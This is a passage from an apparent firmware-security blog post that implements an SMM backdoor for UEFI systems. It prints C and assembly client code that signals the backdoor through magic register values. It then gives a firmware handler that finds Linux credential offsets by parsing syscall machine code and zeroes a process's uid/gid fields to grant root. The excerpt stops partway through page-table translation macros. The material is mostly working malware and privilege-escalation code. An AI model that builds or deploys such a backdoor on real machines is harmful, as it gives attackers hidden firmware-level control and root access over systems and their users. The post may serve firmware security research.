<span style="color: #7f0055;">#</span><span style="color: #7f0055;">include </span><span style="color: #2a00ff;">&lt;</span><span style="color: #3f3fbf;">stdio.h</span><span style="color: #2a00ff;">&gt;</span>
<span style="color: #7f0055;">#</span><span style="color: #7f0055;">include </span><span style="color: #2a00ff;">&lt;</span><span style="color: #3f3fbf;">stdlib.h</span><span style="color: #2a00ff;">&gt;</span>
<span style="color: #7f0055;">#</span><span style="color: #7f0055;">include </span><span style="color: #2a00ff;">&lt;</span><span style="color: #3f3fbf;">sched.h</span><span style="color: #2a00ff;">&gt;</span>
<span style="color: #7f0055;">#</span><span style="color: #7f0055;">include </span><span style="color: #2a00ff;">&lt;</span><span style="color: #3f3fbf;">errno.h</span><span style="color: #2a00ff;">&gt;</span>
<span style="color: #7f0055;">#</span><span style="color: #7f0055;">include </span><span style="color: #2a00ff;">&lt;</span><span style="color: #3f3fbf;">string.h</span><span style="color: #2a00ff;">&gt;</span>
<span style="color: #7f0055;">#</span><span style="color: #7f0055;">include </span><span style="color: #2a00ff;">&lt;</span><span style="color: #3f3fbf;">inttypes.h</span><span style="color: #2a00ff;">&gt;</span>
<span style="color: #7f0055;">#</span><span style="color: #7f0055;">include </span><span style="color: #2a00ff;">&lt;</span><span style="color: #3f3fbf;">unistd.h</span><span style="color: #2a00ff;">&gt;</span>

<span style="color: #3f7f59;">// external function implemented in assembly</span>
<span style="color: #7f0055; font-weight: bold;">extern</span> <span style="color: #7f0055; font-weight: bold;">int</span> smm_call(<span style="color: #7f0055; font-weight: bold;">long</span> code, <span style="color: #7f0055; font-weight: bold;">unsigned</span> <span style="color: #7f0055; font-weight: bold;">long</span> <span style="color: #7f0055; font-weight: bold;">long</span> arg1, <span style="color: #7f0055; font-weight: bold;">unsigned</span> <span style="color: #7f0055; font-weight: bold;">long</span> <span style="color: #7f0055; font-weight: bold;">long</span> arg2);

<span style="color: #7f0055; font-weight: bold;">int</span> <span style="color: #7f0055; font-weight: bold;">main</span>(<span style="color: #7f0055; font-weight: bold;">int</span> argc, <span style="color: #7f0055; font-weight: bold;">char</span> *argv[])
{
    <span style="color: #7f0055; font-weight: bold;">int</span> ret = 0;    
    cpu_set_t mask;

    CPU_ZERO(&amp;mask);
    CPU_SET(0, &amp;mask);

    <span style="color: #3f7f59;">// tells to the scheduler to run current process only on first CPU</span>
    ret = sched_setaffinity(0, <span style="color: #7f0055; font-weight: bold;">sizeof</span>(mask), &amp;mask);
    <span style="color: #7f0055; font-weight: bold;">if</span> (ret != 0)
    {
        <span style="color: #7f0055; font-weight: bold;">printf</span>(<span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">sched_setaffinity() ERROR </span><span style="color: #2a00ff;">%d</span><span style="color: #2a00ff;">\n</span><span style="color: #2a00ff;">"</span>, errno);
        <span style="color: #7f0055; font-weight: bold;">return</span> errno; 
    }

    <span style="color: #7f0055; font-weight: bold;">int</span> code = 0;
    <span style="color: #7f0055; font-weight: bold;">unsigned</span> <span style="color: #7f0055; font-weight: bold;">long</span> <span style="color: #7f0055; font-weight: bold;">long</span> arg1 = 0, arg2 = 0;

    <span style="color: #3f7f59;">/*</span>
<span style="color: #3f7f59;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Parse arguments for SMM backdoor call from command line arguments.</span>
<span style="color: #3f7f59;">&nbsp;&nbsp;&nbsp;&nbsp;*/</span>

    <span style="color: #7f0055; font-weight: bold;">if</span> (argc &gt;= 2)
    {
        <span style="color: #7f0055; font-weight: bold;">if</span> ((code = <span style="color: #7f0055; font-weight: bold;">strtol</span>(argv[1], <span style="color: #7f0055; font-weight: bold;">NULL</span>, 16)) == 0 &amp;&amp; errno == <span style="color: #7f0055; font-weight: bold;">EINVAL</span>)
        {
            <span style="color: #7f0055; font-weight: bold;">printf</span>(<span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">strtol() ERROR </span><span style="color: #2a00ff;">%d</span><span style="color: #2a00ff;">\n</span><span style="color: #2a00ff;">"</span>, errno);
            <span style="color: #7f0055; font-weight: bold;">return</span> errno; 
        }
    }

    <span style="color: #7f0055; font-weight: bold;">if</span> (argc &gt;= 3)
    {
        <span style="color: #7f0055; font-weight: bold;">if</span> ((arg1 = <span style="color: #7f0055; font-weight: bold;">strtoull</span>(argv[2], <span style="color: #7f0055; font-weight: bold;">NULL</span>, 16)) == 0 &amp;&amp; errno == <span style="color: #7f0055; font-weight: bold;">EINVAL</span>)
        {
            <span style="color: #7f0055; font-weight: bold;">printf</span>(<span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">strtoull() ERROR </span><span style="color: #2a00ff;">%d</span><span style="color: #2a00ff;">\n</span><span style="color: #2a00ff;">"</span>, errno);
            <span style="color: #7f0055; font-weight: bold;">return</span> errno; 
        }
    }

    <span style="color: #7f0055; font-weight: bold;">if</span> (argc &gt;= 4)
    {
        <span style="color: #7f0055; font-weight: bold;">if</span> ((arg2 = <span style="color: #7f0055; font-weight: bold;">strtoull</span>(argv[3], <span style="color: #7f0055; font-weight: bold;">NULL</span>, 16)) == 0 &amp;&amp; errno == <span style="color: #7f0055; font-weight: bold;">EINVAL</span>)
        {
            <span style="color: #7f0055; font-weight: bold;">printf</span>(<span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">strtoull() ERROR </span><span style="color: #2a00ff;">%d</span><span style="color: #2a00ff;">\n</span><span style="color: #2a00ff;">"</span>, errno);
            <span style="color: #7f0055; font-weight: bold;">return</span> errno; 
        }
    }    

    <span style="color: #7f0055; font-weight: bold;">printf</span>(
        <span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">Calling SMM backdoor with code = 0x</span><span style="color: #2a00ff;">%x</span><span style="color: #2a00ff;"> and args 0x</span><span style="color: #2a00ff;">%llx</span><span style="color: #2a00ff;">, 0x</span><span style="color: #2a00ff;">%llx</span><span style="color: #2a00ff;">...</span><span style="color: #2a00ff;">\n</span><span style="color: #2a00ff;">"</span>, 
        code, arg1, arg2
    );

    <span style="color: #3f7f59;">/* </span>
<span style="color: #3f7f59;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Jump to infinite loop to call SMM backdoor.</span>
<span style="color: #3f7f59;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;If backdoor is not available - this function hangs forever.</span>
<span style="color: #3f7f59;">&nbsp;&nbsp;&nbsp;&nbsp;*/</span>
    ret = smm_call(code, arg1, arg2);

    <span style="color: #7f0055; font-weight: bold;">printf</span>(<span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">Sucess! Status code: 0x</span><span style="color: #2a00ff;">%.8x</span><span style="color: #2a00ff;">\n</span><span style="color: #2a00ff;">"</span>, ret);

    <span style="color: #7f0055; font-weight: bold;">return</span> ret;
}
</pre>
<br>
Assembly part of client code:<br>
<pre style="overflow-x: auto; overflow-y: auto; white-space: pre; word-wrap: normal;"><span style="color: #7f0055;">BITS</span> 64
<span style="color: #7f0055;">GLOBAL</span> smm_call

<span style="color: #3f7f59;">;</span>
<span style="color: #3f7f59;">; Magic values that backdoor checks for.</span>
<span style="color: #3f7f59;">;</span>
<span style="color: #7f0055;">%define</span><span style="color: #7f0055;"> R8_VAL 0x4141414141414141</span>
<span style="color: #7f0055;">%define</span><span style="color: #7f0055;"> R9_VAL 0x4242424242424242</span>

<span style="color: #3f7f59;">;</span>
<span style="color: #3f7f59;">; int smm_call(long code, unsigned long long arg1, unsigned long long arg2)</span>
<span style="color: #3f7f59;">;</span>
<span style="color: #3f7f59;">; Sends control request with specified code and argument to</span>
<span style="color: #3f7f59;">; SMM backdoor.</span>
<span style="color: #3f7f59;">;</span>
<span style="color: #3f7f59;">; Returns EFI_STATUS of requested operation.</span>
<span style="color: #3f7f59;">;</span>
smm_call:

    <span style="color: #7f0055; font-weight: bold;">push</span>   rcx
    <span style="color: #7f0055; font-weight: bold;">push</span>   r8
    <span style="color: #7f0055; font-weight: bold;">push</span>   r9

    <span style="color: #3f7f59;">; SMI timer handler checks R8 and R9 for this magic values</span>
    <span style="color: #7f0055; font-weight: bold;">mov</span>    r8, R8_VAL
    <span style="color: #7f0055; font-weight: bold;">mov</span>    r9, R9_VAL

    <span style="color: #7f0055; font-weight: bold;">xor</span>    rax, rax
    <span style="color: #7f0055; font-weight: bold;">dec</span>    rax

    <span style="color: #3f7f59;">; jump in infinite loop with RCX as instruction address</span>
    <span style="color: #7f0055; font-weight: bold;">mov</span>    rcx, _loop
    <span style="color: #7f0055; font-weight: bold;">jmp</span>    rcx

    <span style="color: #3f7f59;">; landing area for modified RCX value</span>
    <span style="color: #7f0055; font-weight: bold;">nop</span>
    <span style="color: #7f0055; font-weight: bold;">nop</span>
    <span style="color: #7f0055; font-weight: bold;">nop</span>
    <span style="color: #7f0055; font-weight: bold;">nop</span>
    <span style="color: #7f0055; font-weight: bold;">nop</span>
    <span style="color: #7f0055; font-weight: bold;">nop</span>
    <span style="color: #7f0055; font-weight: bold;">jmp</span><span style="color: #7f0055; font-weight: bold;">    short</span> _end

_loop:
    <span style="color: #3f7f59;">;</span>
    <span style="color: #3f7f59;">; SMI timer handler will be called when process runs in </span>
    <span style="color: #3f7f59;">; infinite loop with magic registers values. SMM backdoor </span>
    <span style="color: #3f7f59;">; decrements RCX value (--&gt; jmp _end) to exit from the loop.</span>
    <span style="color: #3f7f59;">; Code and Arg for SmmCallHandle() are going in RDI and RSI.</span>
    <span style="color: #3f7f59;">;</span>
    <span style="color: #7f0055; font-weight: bold;">nop</span>
    <span style="color: #7f0055; font-weight: bold;">jmp</span>    rcx

_end:

    <span style="color: #7f0055; font-weight: bold;">pop</span>    r9
    <span style="color: #7f0055; font-weight: bold;">pop</span>    r8
    <span style="color: #7f0055; font-weight: bold;">pop</span>    rcx

    <span style="color: #3f7f59;">; SMM backdoor returns status code in RAX register</span>
    <span style="color: #7f0055; font-weight: bold;">ret</span>
</pre>
<br>
Backdoor registers periodic timer SMI handler at startup automatically, 
but it’s possible to ask the backdoor enable or disable it during 
runtime phase using <span style="font-family: Courier New, Courier, monospace;">SmmBackdoor.py</span> program that was mentioned above:
<br>
<br>
<ul>
<li><span style="font-family: Courier New, Courier, monospace;">SmmBackdoor.py --timer-enable</span> — enable periodic timer SMI.</li>
<li><span style="font-family: Courier New, Courier, monospace;">SmmBackdoor.py --timer-disable</span> — disable periodic timer SMI.</li>
</ul>
<br>
<h3>
More advanced payload example&nbsp;</h3>
<br>
When we have SMM communication code that works with any privileges 
levels it will be pretty reasonable to improve the backdoor and write 
payload that accepts a command from attacker’s user mode Linux process 
and gives it the root privileges.<br>
<br>
To get privileges of current process Linux uses <span style="font-family: Courier New, Courier, monospace;"><a href="http://lxr.free-electrons.com/ident?i=sys_getuid">sys_getuid</a>()</span>, <span style="font-family: Courier New, Courier, monospace;"><a href="http://lxr.free-electrons.com/ident?i=sys_geteuid">sys_geteuid</a>()</span>, <span style="font-family: Courier New, Courier, monospace;"><a href="http://lxr.free-electrons.com/ident?i=sys_getgid">sys_getgid</a>()</span> and <span style="font-family: Courier New, Courier, monospace;"><a href="http://lxr.free-electrons.com/ident?i=sys_getegid">sys_getegid</a>()</span> syscalls, lets check their assembly code on example of <span style="font-family: Courier New, Courier, monospace;">sys_getuid()</span>:
<br>
<pre style="overflow-x: auto; overflow-y: auto; white-space: pre; word-wrap: normal;">sys_getuid:

65 48 8b 04 25 00 c7 00 00     mov %gs:0xc700, %rax      ; get task_struct
48 8b 80 88 03 00 00           mov 0x388(%rax), %rax     ; get task_struct-&gt;cred
8b 40 04                       mov 0x4(%rax), %eax       ; get desired value from cred
c3                             retq
</pre>
<br>
As you can see, kernel gets <span style="font-family: Courier New, Courier, monospace;"><a href="http://lxr.free-electrons.com/source/include/linux/sched.h#L1291">task_struct</a></span> structure address for current process from GS segment and obtains current user and group information from <span style="font-family: Courier New, Courier, monospace;">task_struct-&gt;cred.uid</span>, <span style="font-family: Courier New, Courier, monospace;">task_struct-&gt;cred.euid</span>, <span style="font-family: Courier New, Courier, monospace;">task_struct-&gt;cred.gid</span> and <span style="font-family: Courier New, Courier, monospace;">task_struct-&gt;cred.egid</span> fields.<br>
<br>
SMM backdoor code that needs to modify cred values from SMI handler 
apparently relies on their offsets that might be changed across 
different builds and versions of Linux kernel. To avoid the huge amount 
of OS specific logic in backdoor code it receives the addresses of <span style="font-family: Courier New, Courier, monospace;">sys_getuid()</span>, <span style="font-family: Courier New, Courier, monospace;">sys_geteuid()</span>, <span style="font-family: Courier New, Courier, monospace;">sys_getgid()</span> and <span style="font-family: Courier New, Courier, monospace;">sys_getegid()</span>
 kernel functions from client and extracts required fields offsets from 
their binary code. To give process root privileges backdoor just sets 
these fields values to zero:<br>
<pre style="height: 500px; overflow-x: auto; overflow-y: auto; white-space: pre; word-wrap: normal;"><span style="color: #3f7f59;">/* </span>
<span style="color: #3f7f59;">&nbsp;&nbsp;&nbsp;&nbsp;Dispatch SMM backdoor command from SW SMI or periodic timer handler.</span>
<span style="color: #3f7f59;">&nbsp;&nbsp;&nbsp;&nbsp;Code, Arg1 and Arg2 usually comes from CPU register values that was set by backdoor client.</span>
<span style="color: #3f7f59;">*/</span>
EFI_STATUS SmmCallHandle(UINT64 Code, UINT64 Arg1, UINT64 Arg2, PCONTROL_REGS ControlRegs)
{
    EFI_STATUS Status = EFI_INVALID_PARAMETER;    

    <span style="color: #7f0055; font-weight: bold;">switch</span> (Code)
    {
    <span style="color: #7f0055; font-weight: bold;">case </span><span style="color: #7f0055; font-weight: bold;">BACKDOOR_PRIVESC</span><span style="color: #7f0055; font-weight: bold;">:</span>
        {
            UINT64 Addr = 0, GsBase = 0;
            <span style="color: #7f0055; font-weight: bold;">int</span> OffsetTaskStruct = 0, OffsetCred = 0;
            <span style="color: #7f0055; font-weight: bold;">unsigned</span> <span style="color: #7f0055; font-weight: bold;">char</span> OffsetCredVal = 0;

            <span style="color: #7f0055; font-weight: bold;">if</span> (Arg1 == 0)
            {
                DbgMsg(__FILE__, __LINE__, <span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">ERROR: Arg1 must be specified</span><span style="color: #2a00ff;">\r</span><span style="color: #2a00ff;">\n</span><span style="color: #2a00ff;">"</span>);
                
                Status = EFI_INVALID_PARAMETER;
                <span style="color: #7f0055; font-weight: bold;">goto</span> _end;
            }

            <span style="color: #3f7f59;">// check that long mode paging is enabled</span>
            <span style="color: #7f0055; font-weight: bold;">if</span> (!Check_IA_32e(ControlRegs))
            {
                DbgMsg(__FILE__, __LINE__, <span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">ERROR: IA-32e paging is not enabled</span><span style="color: #2a00ff;">\r</span><span style="color: #2a00ff;">\n</span><span style="color: #2a00ff;">"</span>);
                
                Status = EFI_INVALID_PARAMETER;
                <span style="color: #7f0055; font-weight: bold;">goto</span> _end;
            }

            DbgMsg(__FILE__, __LINE__, <span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">Syscall address is 0x</span><span style="color: #2a00ff;">%llx</span><span style="color: #2a00ff;">\r</span><span style="color: #2a00ff;">\n</span><span style="color: #2a00ff;">"</span>, Arg1);

            <span style="color: #3f7f59;">// get physical address of syscall</span>
            <span style="color: #7f0055; font-weight: bold;">if</span> ((Status = VirtualToPhysical(Arg1, &amp;Addr, ControlRegs-&gt;Cr3)) == EFI_SUCCESS)
            {                
                <span style="color: #3f7f59;">/*</span>
<span style="color: #3f7f59;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;User
 mode program (smm_call) passing sys_getuid/euid/gid/egid</span>
<span style="color: #3f7f59;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;function
 address in 1-st argument, we need to analyse it's code</span>
<span style="color: #3f7f59;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;and
 get offsets to task_struct, cred and uid/euid/gid/egid fields.</span>
<span style="color: #3f7f59;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Then
 we just set filed value to 0 (root).</span>
<span style="color: #3f7f59;"></span>
<span style="color: #3f7f59;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sys_getuid
 code as example:</span>
<span style="color: #3f7f59;"></span>
<span style="color: #3f7f59;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov
    %gs:0xc700, %rax   ; get task_struct</span>
<span style="color: #3f7f59;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov
    0x388(%rax), %rax  ; get task_struct-&gt;cred</span>
<span style="color: #3f7f59;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov
    0x4(%rax), %eax    ; get desired value from cred</span>
<span style="color: #3f7f59;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;retq</span>
<span style="color: #3f7f59;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/</span>
                <span style="color: #7f0055; font-weight: bold;">if</span> (<span style="color: #7f0055; font-weight: bold;">memcmp</span>((<span style="color: #7f0055; font-weight: bold;">void</span> *)(Addr + 0x00), <span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">\x65</span><span style="color: #2a00ff;">\x48</span><span style="color: #2a00ff;">\x8b</span><span style="color: #2a00ff;">\x04</span><span style="color: #2a00ff;">\x25</span><span style="color: #2a00ff;">"</span>, 5) ||
                    <span style="color: #7f0055; font-weight: bold;">memcmp</span>((<span style="color: #7f0055; font-weight: bold;">void</span> *)(Addr + 0x09), <span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">\x48</span><span style="color: #2a00ff;">\x8b</span><span style="color: #2a00ff;">\x80</span><span style="color: #2a00ff;">"</span>, 3) ||
                    <span style="color: #7f0055; font-weight: bold;">memcmp</span>((<span style="color: #7f0055; font-weight: bold;">void</span> *)(Addr + 0x10), <span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">\x8b</span><span style="color: #2a00ff;">\x40</span><span style="color: #2a00ff;">"</span>, 2))
                {
                    DbgMsg(__FILE__, __LINE__, <span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">ERROR: Unexpected binary code</span><span style="color: #2a00ff;">\r</span><span style="color: #2a00ff;">\n</span><span style="color: #2a00ff;">"</span>);
                    
                    Status = EFI_INVALID_PARAMETER;
                    <span style="color: #7f0055; font-weight: bold;">goto</span> _end;
                }

                <span style="color: #3f7f59;">// get fields offsets</span>
                OffsetCredVal = *(<span style="color: #7f0055; font-weight: bold;">unsigned</span> <span style="color: #7f0055; font-weight: bold;">char</span> *)(Addr + 0x12);
                OffsetTaskStruct = *(<span style="color: #7f0055; font-weight: bold;">int</span> *)(Addr + 0x05);
                OffsetCred = *(<span style="color: #7f0055; font-weight: bold;">int</span> *)(Addr + 0x0c);                

                DbgMsg(
                    __FILE__, __LINE__, 
                    <span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">task_struct offset: 0x</span><span style="color: #2a00ff;">%x</span><span style="color: #2a00ff;">, cred offset: 0x</span><span style="color: #2a00ff;">%x</span><span style="color: #2a00ff;">, cred value offset: 0x</span><span style="color: #2a00ff;">%x</span><span style="color: #2a00ff;">\r</span><span style="color: #2a00ff;">\n</span><span style="color: #2a00ff;">"</span>,
                    OffsetTaskStruct, OffsetCred, OffsetCredVal
                );
            }
            <span style="color: #7f0055; font-weight: bold;">else</span>
            {
                DbgMsg(
                    __FILE__, __LINE__, 
                    <span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">ERROR: Unable to resolve physical address for 0x</span><span style="color: #2a00ff;">%llx</span><span style="color: #2a00ff;">\r</span><span style="color: #2a00ff;">\n</span><span style="color: #2a00ff;">"</span>, Arg1
                );

                <span style="color: #7f0055; font-weight: bold;">goto</span> _end;
            }

            <span style="color: #3f7f59;">// get GS segment base address</span>
            GsBase = __readmsr(IA32_KERNEL_GS_BASE);            

            DbgMsg(__FILE__, __LINE__, <span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">GS base is 0x</span><span style="color: #2a00ff;">%llx</span><span style="color: #2a00ff;">\r</span><span style="color: #2a00ff;">\n</span><span style="color: #2a00ff;">"</span>, GsBase);

            <span style="color: #3f7f59;">// check if GS base points to user-mode</span>
            <span style="color: #7f0055; font-weight: bold;">if</span> ((GsBase &gt;&gt; 63) == 0)
            {
                DbgMsg(__FILE__, __LINE__, <span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">ERROR: Bad GS base</span><span style="color: #2a00ff;">\r</span><span style="color: #2a00ff;">\n</span><span style="color: #2a00ff;">"</span>);
                
                Status = EFI_INVALID_PARAMETER;
                <span style="color: #7f0055; font-weight: bold;">goto</span> _end;
            }            

            <span style="color: #3f7f59;">// get physical address of GS base</span>
            <span style="color: #7f0055; font-weight: bold;">if</span> ((Status = VirtualToPhysical(GsBase, &amp;Addr, ControlRegs-&gt;Cr3)) == EFI_SUCCESS)
            {                
                UINT64 TaskStruct = *(UINT64 *)(Addr + OffsetTaskStruct);   

                DbgMsg(__FILE__, __LINE__, <span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">task_struct is at 0x</span><span style="color: #2a00ff;">%llx</span><span style="color: #2a00ff;">\r</span><span style="color: #2a00ff;">\n</span><span style="color: #2a00ff;">"</span>, TaskStruct);

                <span style="color: #3f7f59;">// get physical address of task_struct structure</span>
                <span style="color: #7f0055; font-weight: bold;">if</span> ((Status = VirtualToPhysical(TaskStruct, &amp;Addr, ControlRegs-&gt;Cr3)) == EFI_SUCCESS)
                {
                    UINT64 Cred = *(UINT64 *)(Addr + OffsetCred);   

                    DbgMsg(__FILE__, __LINE__, <span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">cred is at 0x</span><span style="color: #2a00ff;">%llx</span><span style="color: #2a00ff;">\r</span><span style="color: #2a00ff;">\n</span><span style="color: #2a00ff;">"</span>, Cred);

                    <span style="color: #3f7f59;">// get physical address of task_struct-&gt;cred structure</span>
                    <span style="color: #7f0055; font-weight: bold;">if</span> ((Status = VirtualToPhysical(Cred, &amp;Addr, ControlRegs-&gt;Cr3)) == EFI_SUCCESS)
                    {
                        <span style="color: #7f0055; font-weight: bold;">int</span> *CredVal = (<span style="color: #7f0055; font-weight: bold;">int</span> *)(Addr + OffsetCredVal);

                        DbgMsg(
                            __FILE__, __LINE__, 
                            <span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">Current cred value is </span><span style="color: #2a00ff;">%d</span><span style="color: #2a00ff;"> (setting to 0)</span><span style="color: #2a00ff;">\r</span><span style="color: #2a00ff;">\n</span><span style="color: #2a00ff;">"</span>, *CredVal
                        );

                        <span style="color: #3f7f59;">// set root privilleges</span>
                        *CredVal = 0;
                    }
                    <span style="color: #7f0055; font-weight: bold;">else</span>
                    {
                        DbgMsg(
                            __FILE__, __LINE__, 
                            <span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">ERROR: Unable to resolve physical address for 0x</span><span style="color: #2a00ff;">%llx</span><span style="color: #2a00ff;">\r</span><span style="color: #2a00ff;">\n</span><span style="color: #2a00ff;">"</span>, Cred
                        );
                    }
                }
                <span style="color: #7f0055; font-weight: bold;">else</span>
                {
                    DbgMsg(
                        __FILE__, __LINE__, 
                        <span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">ERROR: Unable to resolve physical address for 0x</span><span style="color: #2a00ff;">%llx</span><span style="color: #2a00ff;">\r</span><span style="color: #2a00ff;">\n</span><span style="color: #2a00ff;">"</span>, TaskStruct
                    );
                }
            }
            <span style="color: #7f0055; font-weight: bold;">else</span>
            {
                DbgMsg(
                    __FILE__, __LINE__, 
                    <span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">ERROR: Unable to resolve physical address for 0x</span><span style="color: #2a00ff;">%llx</span><span style="color: #2a00ff;">\r</span><span style="color: #2a00ff;">\n</span><span style="color: #2a00ff;">"</span>, GsBase
                );
            }
        }
    } 

_end:

    <span style="color: #7f0055; font-weight: bold;">return</span> Status;
}
</pre>
<br>
Backdoor code that implements virtual to physical address translation for IA-32 long mode in according to Intel manuals:<br>
<pre style="height: 500px; overflow-x: auto; overflow-y: auto; white-space: pre; word-wrap: normal;"><span style="color: #7f0055;">#</span><span style="color: #7f0055;">define</span><span style="color: #7f0055;"> PFN_TO_PAGE</span><span style="color: #7f0055;">(</span><span style="color: #7f0055;">_val_</span><span style="color: #7f0055;">)</span><span style="color: #7f0055;"> </span><span style="color: #7f0055;">(</span><span style="color: #7f0055;">(</span><span style="color: #7f0055;">_val_</span><span style="color: #7f0055;">)</span><span style="color: #7f0055;"> </span><span style="color: #7f0055;">&lt;</span><span style="color: #7f0055;">&lt;</span><span style="color: #7f0055;"> PAGE_SHIFT</span><span style="color: #7f0055;">)</span>
<span style="color: #7f0055;">#</span><span style="color: #7f0055;">define</span><span style="color: #7f0055;"> PAGE_TO_PFN</span><span style="color: #7f0055;">(</span><span style="color: #7f0055;">_val_</span><span style="color: #7f0055;">)</span><span style="color: #7f0055;"> </span><span style="color: #7f0055;">(</span><span style="color: #7f0055;">(</span><span style="color: #7f0055;">_val_</span><span style="color: #7f0055;">)</span><span style="color: #7f0055;"> </span><span style="color: #7f0055;">&gt;</span><span style="color: #7f0055;">&gt;</span><span style="color: #7f0055;"> PAGE_SHIFT</span><span style="color: #7f0055;">)</span>

<span style="color: #3f7f59;">// get MPL4 address from CR3 register value</span>
<span style="color: #7f0055;">#</span><span style="color: #7f0055;">define</span><span style="color: #7f0055;"> PML4_ADDRESS</span><span style="color: #7f0055;">(</span><span style="color: #7f0055;">_val_</span><span style="color: #7f0055;">)</span><span style="color: #7f0055;"> </span><span style="color: #7f0055;">(</span><span style="color: #7f0055;">(</span><span style="color: #7f0055;">_val_</span><span style="color: #7f0055;">)</span><span style="color: #7f0055;"> </span><span style="color: #7f0055;">&amp;</span><span style="color: #7f0055;"> 0xfffffffffffff000</span><span style="color: #7f0055;">)</span>

<span style="color: #3f7f59;">// get PML4 indexes from virtual address</span>
<span style="color: #7f0055;">#</span><span style="color: #7f0055;">define</span><span style="color: #7f0055;"> PML4_INDEX</span><span style="color: #7f0055;">(</span><span style="color: #7f0055;">_addr_</span><span style="color: #7f0055;">)</span><span style="color: #7f0055;"> </span><span style="color: #7f0055;">(</span><span style="color: #7f0055;">(</span><span style="color: #7f0055;">(</span><span style="color: #7f0055;">_addr_</span><span style="color: #7f0055;">)</span><span style="color: #7f0055;"> </span><span style="color: #7f0055;">&gt;</span><span style="color: #7f0055;">&gt;</span><span style="color: #7f0055;"> 39</span><span style="color: #7f0055;">)</span><span style="color: #7f0055;"> </span><span style="color: #7f0055;">&amp;</span><span style="color: #7f0055;"> 0x1ff</span><span style="color: #7f0055;">)</span>
<span style="color: #7f0055;">#</span><span style="color: #7f0055;">define</span><span style="color: #7f0055;"> PDPT_INDEX</span><span style="color: #7f0055;">(</span><span style="color: #7f0055;">_addr_</span><span style="color: #7f0055;">)</span><span style="color: #7f0055;"> </span><span style="color: #7f0055;">(</span><span style="color: #7f0055;">(</span><span style="color: #7f0055;">(</span><span style="color: #7f0055;">_addr_</span><span style="color: #7f0055;">)</span><span style="color: #7f0055;"> </span><span style="color: #7f0055;">&gt;</span><span style="color: #7f0055;">&gt;</span><span style="color: #7f0055;"> 30</span><span style="color: #7f0055;">)</span><span style="color: #7f0055;"> </span><span style="color: #7f0055;">&amp;</span><span style="color: #7f0055;"> 0x1ff</span><span style="color: #7f0055;">)</span>
